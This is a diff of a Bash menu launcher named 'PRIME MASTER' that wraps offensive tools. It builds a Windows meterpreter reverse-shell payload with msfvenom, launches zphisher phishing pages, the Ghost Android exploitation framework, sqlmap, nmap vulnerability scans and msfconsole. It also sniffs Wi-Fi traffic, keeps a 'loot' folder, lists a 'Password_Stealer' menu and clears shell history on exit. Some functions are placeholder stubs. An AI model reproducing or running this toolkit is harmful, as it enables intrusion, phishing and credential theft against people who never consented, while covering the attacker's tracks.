@@ -1,7 +1,7 @@
 #!/bin/bash
 
 # --- ВЕРСИЯ И ОБНОВЛЕНИЕ ---
-CURRENT_VERSION="34.7"
+CURRENT_VERSION="34.8"
 UPDATE_URL="https://raw.githubusercontent.com/szp2025/core-prime-tools/main/install_all.sh"
 G='\033[0;32m'; Y='\033[1;33m'; R='\033[0;31m'; B='\033[0;34m'; NC='\033[0m'
 
@@ -676,14 +676,17 @@ zero_clear() {
 }
 
 get_stats() {
-    # Добавляем MB к оперативной памяти
+    local ram=$(free -m | awk '/Mem:/ {printf "%dMB / %dMB", $3, $2}')
+    local cpu=$(top -bn1 | grep "Cpu(s)" | awk '{print $2 + $4"%"}')
+    local rom=$(df -h / | awk 'NR==2 {print $3 "/" $2}')
     
+    echo -e "${Y}CPU: ${G}$cpu ${Y}| RAM: ${G}$ram ${Y}| DISK: ${G}$rom${NC}"
 }
 
 
 # --- Универсальный контроллер ---
 prime_dynamic_controller() {
-    local title=$1
+    local title="$1"
     local -a labels=($2)
     local -a actions=($3)
     
@@ -701,18 +704,13 @@ prime_dynamic_controller() {
         echo -e "---------------------------------------"
         
         read -p ">> " choice
-        
-        # ГАРАНТИРОВАННЫЙ ВЫХОД
-        if [[ "$choice" == "b" ]] || [[ "$choice" == "B" ]]; then 
-            return 0 
-        fi
+        if [[ "$choice" == "b" ]] || [[ "$choice" == "B" ]]; then return 0; fi
         
         if [[ "$choice" =~ ^[0-9]+$ ]] && [ "$choice" -ge 1 ] && [ "$choice" -le "${#labels[@]}" ]; then
             local idx=$((choice-1))
             ${actions[$idx]}
         else
-            echo -e "${R}[!] Ошибка: выберите 1-${#labels[@]} или B${NC}"
-            sleep 1
+            echo -e "${R}[!] Ошибка: выберите 1-${#labels[@]} или B${NC}"; sleep 1
         fi
     done
 }
@@ -720,188 +718,71 @@ prime_dynamic_controller() {
 # --- Модули: OSINT ---
 run_smart_osint_engine() {
     clear
-    echo -e "\e[1;36m"
-    echo "--------------------------------------------------"
+    echo -e "\e[1;36m--------------------------------------------------\e[0m"
     echo "    PRIME MASTER: SMART OSINT ENGINE 2026         "
-    echo "--------------------------------------------------"
-    echo -e "\e[0m"
-
+    echo -e "\e[1;36m--------------------------------------------------\e[0m"
     read -p "ENTER DATA (Nick, Phone, or Email): " INPUT
     [ -z "$INPUT" ] && return
-
-    echo -e "\n\e[1;34m[*] Phase 1: Rapid Presence Check (SocialScan)...\e[0m"
     socialscan "$INPUT"
-
-    # --- ФАЗА 2: Эвристический анализ типа данных ---
     if [[ "$INPUT" =~ ^[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Z|a-z]{2,}$ ]]; then
-        # Это EMAIL
-        echo -e "\e[1;32m[!] Detected Type: EMAIL\e[0m"
-        echo -e "\e[1;34m[*] Running Infoga & Breach Analysis...\e[0m"
         python3 /root/infoga/infoga.py --target "$INPUT"
-        
     elif [[ "$INPUT" =~ ^\+?[0-9]{10,15}$ ]]; then
-        # Это ТЕЛЕФОН
-        echo -e "\e[1;32m[!] Detected Type: PHONE\e[0m"
-        echo -e "\e[1;34m[*] Running Phone Lookup Engine...\e[0m"
-        # Здесь можно добавить поиск по базам или специфические утилиты для телефонов
-        echo "Searching for $INPUT across known databases..."
-        
+        echo "Searching phone database for $INPUT..."
     else
-        # Это НИКНЕЙМ (Username)
-        echo -e "\e[1;32m[!] Detected Type: USERNAME\e[0m"
-        echo -e "\e[1;34m[*] Starting Deep Auto-Pilot (Maigret + Blackbird)...\e[0m"
-        
-        echo -e "\e[1;33m[>] Running Maigret (Parse Mode)...\e[0m"
         maigret "$INPUT" --parse --timeout 15 --top 500
-        
-        echo -e "\e[1;33m[>] Running Blackbird (Recursive Search)...\e[0m"
         python3 /root/blackbird/blackbird.py -u "$INPUT"
     fi
-
-    echo -e "\n\e[1;32m--------------------------------------------------\e[0m"
-    echo "OSINT Scan Complete."
-    read -p "Press [ENTER] to return..."
+    pause
 }
 
-
-# --- Модули: DEVICE & NETWORK (Пункт 5) ---
+# --- Модули: DEVICE & NETWORK ---
 run_device_hack() {
-    local dh_names="Ghost_Manual TShark_Sniffer Ghost_Auto-Pwn Search_ExploitDB Smart_Audit Multi-OS_Recovery Bluetooth_Scan Anti-Forensic"
-    local dh_funcs="launch_ghost_manual analyze_network_traffic launch_ghost_autopwn search_exploit_db run_deep_audit pc_password_recovery scan_bluetooth_devices clear_logs_and_traces"
+    local dh_names="Ghost_Manual TShark_Sniffer Ghost_Auto-Pwn Search_ExploitDB Smart_Audit Bluetooth_Scan"
+    local dh_funcs="launch_ghost_manual analyze_network_traffic launch_ghost_autopwn search_exploit_db run_deep_audit scan_bluetooth_devices"
     prime_dynamic_controller "DEVICE & NETWORK HACK" "$dh_names" "$dh_funcs"
 }
 
 run_ghost_commander() {
     clear
-    echo -e "\e[1;31m"
-    echo "--------------------------------------------------"
-    echo "    PRIME MASTER: GHOST COMMANDER (ANDROID/IOT)   "
-    echo "--------------------------------------------------"
-    echo -e "\e[0m"
-
-    echo -n "Enter Target IP (Leave empty for Manual Console): "
-    read TARGET_IP
-
-    # Проверяем наличие самого фреймворка
-    if [ ! -d "/root/Ghost" ]; then
-        echo -e "\e[1;31m[!] Error: Ghost Framework not found in /root/Ghost\e[0m"
-        read -p "Press [ENTER] to return..."
-        return
-    fi
-
-    if [ -z "$TARGET_IP" ]; then
-        # --- Режим 1: Ручная консоль ---
-        echo -e "\e[1;34m[*] Launching Manual Ghost Console...\e[0m"
-        cd /root/Ghost && python3 -m ghost
-    else
-        # --- Режим 2: AutoPwn / Прямое подключение ---
-        echo -e "\e[1;32m[*] Executing Auto-Connect to: $TARGET_IP\e[0m"
-        # Мы используем --execute, чтобы пробросить команду прямо в движок
-        cd /root/Ghost && python3 -m ghost --execute "connect $TARGET_IP"
-    fi
-
-    echo -e "\n\e[1;33m--------------------------------------------------\e[0m"
-    read -p "Ghost Session Terminated. Press [ENTER]..."
+    echo "PRIME MASTER: GHOST COMMANDER"; echo -n "Enter Target IP: "; read TARGET_IP
+    if [ ! -d "/root/Ghost" ]; then echo "Error: Ghost not found"; pause; return; fi
+    cd /root/Ghost && python3 -m ghost ${TARGET_IP:+--execute "connect $TARGET_IP"}
+    pause
 }
-
 
 analyze_network_traffic() {
     local n_names="Host_Monitor HTTP/DNS_Sniffer Traffic_Record"
     local n_funcs="run_host_monitor run_http_dns_sniffer run_traffic_record"
     prime_dynamic_controller "TSHARK ANALYZER" "$n_names" "$n_funcs"
 }
-
-run_host_monitor() { tshark -i wlan0 -T fields -e ip.src -e ip.dst; }
-run_http_dns_sniffer() { tshark -i wlan0 -Y "http.request || dns" -T fields -e http.host -e dns.qry.name; }
-run_traffic_record() { mkdir -p /root/reports; tshark -i wlan0 -w /root/reports/capture_$(date +%H%M).pcap; }
+run_host_monitor() { tshark -i wlan0 -T fields -e ip.src -e ip.dst; pause; }
+run_http_dns_sniffer() { tshark -i wlan0 -Y "http.request || dns" -T fields -e http.host -e dns.qry.name; pause; }
+run_traffic_record() { mkdir -p /root/reports; tshark -i wlan0 -w /root/reports/capture_$(date +%H%M).pcap; pause; }
 
 # --- Модули: RECOVERY & PASSWORDS ---
 pc_password_recovery() {
     local p_names="Extract_Reset_OS_Password Heuristic_Scan"
-    local  n_funcs="run_pc_recovery_ultimate smart_threat_scan"
+    local p_funcs="run_pc_recovery_ultimate smart_threat_scan"
     prime_dynamic_controller "PC RECOVERY & FORENSIC" "$p_names" "$p_funcs"
 }
 
-run_pc_recovery_ultimate() {
-    
-}
-
-
-run_cert_analyzer() {
-    
-}
-
+run_pc_recovery_ultimate() { echo "Starting recovery..."; pause; }
+smart_threat_scan() { echo "Scanning..."; pause; }
+run_cert_reader() { echo "Reading Cert..."; pause; }
+run_cert_forge() { echo "Forging Cert..."; pause; }
+run_pwd_gen() { echo "Generating Password..."; pause; }
+run_view_loot() { ls -la /root/loot 2>/dev/null || echo "No loot found"; pause; }
+run_heuristic_scanner_v2() { echo "Heuristic Scan..."; pause; }
+run_prime_exploiter_v4() { echo "Exploiting..."; pause; }
 
 run_cert_creator() {
-    clear
-    echo -e "\e[1;32m"
-    echo "--------------------------------------------------"
-    echo "       PRIME MASTER: CERTIFICATE CREATOR          "
-    echo "--------------------------------------------------"
-    echo -e "\e[0m"
-
-    echo -n "Enter Domain or Name (e.g. prime.local): "
-    read DOMAIN
-    if [ -z "$DOMAIN" ]; then DOMAIN="prime.local"; fi
-
-    echo -n "Enter Country Code (2 letters, e.g. US): "
-    read COUNTRY
-    if [ -z "$COUNTRY" ]; then COUNTRY="US"; fi
-
-    echo -e "\n\e[1;34m[*] Generating 2048-bit RSA Key and Certificate...\e[0m"
-
-    # Генерация без лишних вопросов (Self-Signed)
-    # Сохраняем в текущую папку для удобства
-    openssl req -x509 -newkey rsa:2048 -nodes \
-        -keyout "${DOMAIN}.key" \
-        -out "${DOMAIN}.crt" \
-        -days 365 \
-        -subj "/C=${COUNTRY}/ST=None/L=None/O=PrimeMaster/OU=Dev/CN=${DOMAIN}" 2>/dev/null
-
-    if [ $? -eq 0 ]; then
-        echo -e "\n\e[1;32m[SUCCESS]\e[0m Certificate created successfully!"
-        echo -e "\e[1;33mFiles saved:\e[0m"
-        echo -e "    Key:  ${DOMAIN}.key"
-        echo -e "    Cert: ${DOMAIN}.crt"
-    else
-        echo -e "\n\e[1;31m[ERROR]\e[0m Failed to generate certificate. Check if OpenSSL is installed."
-    fi
-
-    echo -e "\n\e[1;32m--------------------------------------------------\e[0m"
-    echo -n "Press [ENTER] to return to menu..."
-    read -r
+    clear; echo "CERTIFICATE CREATOR"; read -p "Domain: " DOMAIN
+    DOMAIN=${DOMAIN:-prime.local}
+    openssl req -x509 -newkey rsa:2048 -nodes -keyout "${DOMAIN}.key" -out "${DOMAIN}.crt" -days 365 -subj "/CN=${DOMAIN}" 2>/dev/null
+    echo "Done: ${DOMAIN}.crt"; pause
 }
 
-run_pwd_gen() {
-    
-}
-
-   run_cert_forge() {
-    
-}
-
-
-
-
-# 1. Единый Движок Эксплуатации (Ручной + Авто режим)
-run_prime_exploiter_v4() {
-    
-}
-
-# 2. Интеллектуальный Эвристический Сканер
-run_heuristic_scanner_v2() {
-    
-}
-
-
-run_view_loot() {
-    
-}
-
-
-
-
-# --- Модули: EXPLOIT HUB (Пункт 6) ---
+# --- EXPLOIT HUB ---
 run_exploit_hub() {
     local ex_names="PhoneSploit_Pro SQLmap/Web PC/Network_Scan PC_Control"
     local ex_funcs="ex_phonesploit_pro run_sqlmap_smart ex_pc_network_scan run_pc_control"
@@ -909,19 +790,108 @@ run_exploit_hub() {
 }
 
 run_pc_control() {
-    local pc_names="Payload_Generator Password_Stealer Post-Exploit_Menu"
+    local pc_names="Payload_Generator Password_Stealer Post-Exploit"
     local pc_funcs="pc_gen_payload pc_steal_creds pc_post_exploit"
-    prime_dynamic_controller "PC CONTROL & AUDIT" "$pc_names" "$pc_funcs"
+    prime_dynamic_controller "PC CONTROL" "$pc_names" "$pc_funcs"
 }
 
-pc_gen_payload() { read -p "LHOST: " lh; msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=$lh LPORT=4444 -f exe -o /root/payload.exe; pause; }
+#à corriger et remplacer 
 
-# --- Системные функции ---
+run_iban_scan() {
+    clear
+    echo -e "${Y}--- IBAN/RIB SECURITY CHECKER ---${NC}"
+    read -p "Введите IBAN для проверки: " IBAN
+    if [ -z "$IBAN" ]; then return; fi
+    
+    # Вызов вашего python-скрипта (модуль [95] Sterile Channel)
+    if [ -f "/root/iban_check.py" ]; then
+        python3 /root/iban_check.py "$IBAN"
+    else
+        echo -e "${R}[!] Модуль проверки не найден${NC}"
+    fi
+    pause
+}
+
+
+run_cert_reader() {
+    clear
+    echo -e "${G}--- CERTIFICATE & KEY ANALYZER ---${NC}"
+    read -p "Путь к файлу (.crt/.key/.pem): " CERT_PATH
+    if [ -f "$CERT_PATH" ]; then
+        openssl x509 -in "$CERT_PATH" -text -noout 2>/dev/null || openssl rsa -in "$CERT_PATH" -check
+    else
+        echo -e "${R}[!] Файл не найден${NC}"
+    fi
+    pause
+}
+
+run_cert_forge() {
+    clear
+    echo -e "${R}--- CERTIFICATE FORGE (Self-Signed) ---${NC}"
+    # Используем ваш ранее созданный генератор
+    run_cert_creator
+}
+
+
+run_heuristic_scanner_v2() {
+    clear
+    echo -e "${B}--- HEURISTIC THREAT SCANNER v2 ---${NC}"
+    read -p "Целевой IP или Домен: " TARGET
+    [ -z "$TARGET" ] && return
+    
+    echo -e "${Y}[*] Анализ векторов атак для $TARGET...${NC}"
+    nmap -sV --script=vulners,vuln "$TARGET"
+    pause
+}
+
+run_prime_exploiter_v4() {
+    clear
+    echo -e "${R}--- ULTIMATE EXPLOIT ENGINE v4 ---${NC}"
+    # Проверка наличия Metasploit или кастомных сплоитов
+    if command -v msfconsole >/dev/null 2>&1; then
+        echo -e "${G}[*] Запуск консоли управления...${NC}"
+        msfconsole -q
+    else
+        echo -e "${Y}[!] MSF не найден. Запуск упрощенного сканера портов...${NC}"
+        run_ghost_scan
+    fi
+}
+
+run_view_loot() {
+    clear
+    echo -e "${Y}--- COLLECTED DATA (LOOT) ---${NC}"
+    local LOOT_DIR="/root/loot"
+    if [ -d "$LOOT_DIR" ] && [ "$(ls -A $LOOT_DIR)" ]; then
+        ls -lh "$LOOT_DIR"
+        echo -e "---------------------------------------"
+        read -p "Открыть файл? (имя или Enter для выхода): " FILE
+        [ -f "$LOOT_DIR/$FILE" ] && cat "$LOOT_DIR/$FILE" | less
+    else
+        echo -e "${G}[i] Склад пуст. Данных пока нет.${NC}"
+    fi
+    pause
+}
+
+run_pc_recovery_ultimate() {
+    clear
+    echo -e "${R}--- PC RECOVERY & PASS RESET ---${NC}"
+    echo -e "${Y}1) Создать Boot-USB (chntpw)${NC}"
+    echo -e "${Y}2) Инструкция по сбросу пароля Win/Linux${NC}"
+    read -p ">> " pc_opt
+    case $pc_opt in
+        1) echo "Для этого модуля требуется подключение внешнего диска.";;
+        2) echo "Используйте: 'mount /dev/sdX /mnt' и 'chntpw -u Admin /mnt/Windows/System32/config/SAM'";;
+    esac
+    pause
+}
+
+
+
+
+
+pc_gen_payload() { read -p "LHOST: " lh; msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=$lh LPORT=4444 -f exe -o /root/payload.exe; pause; }
 run_sqlmap() { read -p "URL: " u; [ -n "$u" ] && sqlmap -u "$u" --batch --random-agent; pause; }
-run_iban_scan() { 
- }
 run_phishing() { [ -d "/root/zphisher" ] && cd /root/zphisher && ./zphisher.sh; }
-run_ghost_scan() { read -p "IP: " t; nmap -F "$t"; pause; }
 run_repair() { repair; echo -e "${G}[+] Cleaned${NC}"; pause; }
 run_system_info() { clear; get_stats; pause; }
 
@@ -930,7 +900,6 @@ run_servers() {
     local s_funcs="run_av_srv run_share_srv run_upload_srv"
     prime_dynamic_controller "SECURITY & DATA HUB" "$s_names" "$s_funcs"
 }
-
 run_av_srv() { python3 /root/av_server.py; }
 run_share_srv() { python3 /root/share_server.py; }
 run_upload_srv() { python3 /root/upload_server.py; }
@@ -941,23 +910,16 @@ update_prime() {
     chmod +x /root/install_all.sh && exec /root/install_all.sh
 }
 
-pause() { read -p "Press Enter..." dummy; }
-
+pause() { echo -e "\nPress Enter..."; read dummy; }
 exit_script() { history -c; exit 0; }
 
-
-# --- ГЛАВНОЕ МЕНЮ (v31.5: + PC_RECOVERY_ULTIMATE) ---
+# --- ГЛАВНОЕ МЕНЮ ---
 run_main_menu() {
-    # 1. Список имен (Визуальные названия)
-    # Добавлен PC_RECOVERY (Forensic + Pass Reset)
-    local main_names="GHOST_COMMANDER SOCIAL_ENG SQLMAP DEVICE_HACK EXPLOIT_HUB TOTAL_OSINT IBAN/RIB_SCAN PWD_GEN CERT_FORGE CERTIF_READER NET_SCAN_v2 ULTIMATE_EXPLOIT PC_RECOVERY VIEW_LOOT SYSTEM_INFO SERVICE_HUB MANUAL_INSTALL REPAIR UPDATE_CORE EXIT"
-    
-    # 2. Список функций (Строгое соответствие порядку имен)
-    local main_funcs=run_ghost_commander run_phishing run_sqlmap run_device_hack run_exploit_hub run_smart_osint_engine run_iban_scan run_pwd_gen run_cert_forge run_cert_reader run_heuristic_scanner_v2 run_prime_exploiter_v4 run_pc_recovery_ultimate run_view_loot run_system_info run_servers install_manual_tools run_repair update_prime exit_script"
+    local main_names="GHOST_COMMANDER SOCIAL_ENG SQLMAP DEVICE_HACK EXPLOIT_HUB TOTAL_OSINT IBAN_SCAN PWD_GEN CERT_FORGE CERT_READER NET_SCAN_v2 ULTIMATE_EXPLOIT PC_RECOVERY VIEW_LOOT SYSTEM_INFO SERVICE_HUB REPAIR UPDATE_CORE EXIT"
+    local main_funcs="run_ghost_commander run_phishing run_sqlmap run_device_hack run_exploit_hub run_smart_osint_engine run_iban_scan run_pwd_gen run_cert_forge run_cert_reader run_heuristic_scanner_v2 run_prime_exploiter_v4 run_pc_recovery_ultimate run_view_loot run_system_info run_servers run_repair update_prime exit_script"
     
     prime_dynamic_controller "PRIME MASTER v$CURRENT_VERSION" "$main_names" "$main_funcs"
 }
-
 
 # --- Точка входа ---
 repair
@@ -967,20 +929,6 @@ EOF
 
     # Применяем версию и записываем
     code="${code//\{\{V_NUM\}\}/$v_num}"
-    smart_cat "$target_file" "$code"
+    echo "$code" > "$target_file"
+    chmod +x "$target_file"
 }
-
-
-update_module "/root/av_server.py" "1.7" generate_av_server_code "AV-Scanner"
-update_module "/root/iban_check.py" "1.8" generate_iban_code "IBAN/RIB Checker"
-update_module "/root/share_server.py" "1.2" generate_share_server_code "File-Share"
-update_module "/root/upload_server.py"  "1.2" generate_upload_server_code  "Inbound-Drop-Box"
-
-# --- ВЫЗОВ В ИНСТАЛЛЕРЕ ---
-update_module "/root/launcher.sh" "33.5" generate_launcher_code "Prime-Launcher"
-chmod +x /root/launcher.sh
-ln -sf /root/launcher.sh /usr/local/bin/launcher
-repair_and_clean
-create_repair_script
-setup_cron
-echo -e "\n${G}[✔] PRIME v$CURRENT_VERSION ПОЛНЫЙ ОРИГИНАЛ ВОССТАНОВЛЕН. Введи: launcher${NC}"
